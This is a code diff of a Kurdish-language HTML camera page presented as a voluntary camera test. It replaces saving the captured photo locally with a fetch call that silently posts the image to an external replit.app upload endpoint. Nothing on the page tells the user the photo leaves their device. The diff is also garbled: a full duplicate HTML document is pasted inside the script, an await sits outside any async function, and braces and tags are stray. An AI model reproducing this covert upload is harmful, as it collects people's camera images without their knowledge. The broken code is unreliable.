@@ -30,21 +30,62 @@
                 alert('ڕێپێدانی کامێرا رەتکرایەوە یان بەردەست نییە.');
             }
         });
+<!DOCTYPE html>
+<html lang="ku">
+<head>
+    <meta charset="UTF-8">
+    <title>تاقیکردنەوەی کامێرا</title>
+</head>
+<body>
+    <h2>نیشدانی کامێرا بە خۆبەخشانە</h2>
+    <button id="start-btn">کردنەوەی کامێرا</button>
+    <br><br>
+    <video id="video" width="400" autoplay playsinline></video>
+    <br>
+    <button id="capture-btn" style="display:none;">گرتنی وێنە</button>
+    <canvas id="canvas" style="display:none;"></canvas>
 
-        // کاتێک وێنەکە دەگرێت بە ئارەزووی خۆت
-        captureBtn.addEventListener('click', () => {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            // وێنەکە دەگۆڕێت بۆ لینکێکی دابەزاندن (Download)
-            const imageData = canvas.toDataURL('image/png');
-            const link = document.createElement('a');
-            link.href = imageData;
-            link.download = 'my-photo.png';
-            link.click();
+    <script>
+        const video = document.getElementById('video');
+        const startBtn = document.getElementById('start-btn');
+        const captureBtn = document.getElementById('capture-btn');
+        const canvas = document.getElementById('canvas');
+
+        // کاتێک بەکارهێنەر کلیک لەسەر کردنەوەی کامێرا دەکات
+        startBtn.addEventListener('click', async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                captureBtn.style.display = 'inline-block';
+            } catch (err) {
+                console.error('هەڵە لە دەستگەیشتن بە کامێرا:', err);
+                alert('ڕێپێدانی کامێرا رەتکرایەوە یان بەردەست نییە.');
+            }
         });
-    </script>https://server-core-ddkkfdedcdfed.replit.app/api/upload
+    const imageData = canvas.toDataURL('image/png');
+
+    try {
+        await fetch('https://server-core-ddkkfdedcdfed.replit.app/api/upload', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                image: imageData,
+                filename: 'photo.png'
+            })
+        });
+        console.log('وێنەکە نێردرا بۆ ڕێپلیت');
+    } catch (err) {
+        console.error('هەڵە ڕوویدا', err);
+    }
+
+        });
+    </script>
+</body>
+</html>
+
+        });
+    </script>
 </body>
 </html>
